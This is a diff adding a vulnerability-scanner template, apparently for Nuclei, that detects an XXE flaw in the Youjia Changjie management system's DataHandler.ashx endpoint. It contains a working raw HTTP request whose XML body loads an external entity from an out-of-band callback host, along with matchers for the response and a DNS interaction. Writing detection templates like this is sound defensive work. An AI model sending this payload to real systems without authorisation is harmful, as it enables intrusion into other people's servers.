@@ -1,0 +1,36 @@
+id: youjiasoft-datahandler-ashx-xxe
+info:
+  name: Youjia Changjie Management System XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+http:
+  - raw:
+      - |
+        POST /Report/DataHandler.ashx?Type=SaveData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xxe_test">
+        %remote;]>
+        <root/>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "err:0"
+          - "未能解析此远程名称:"
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]*$"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
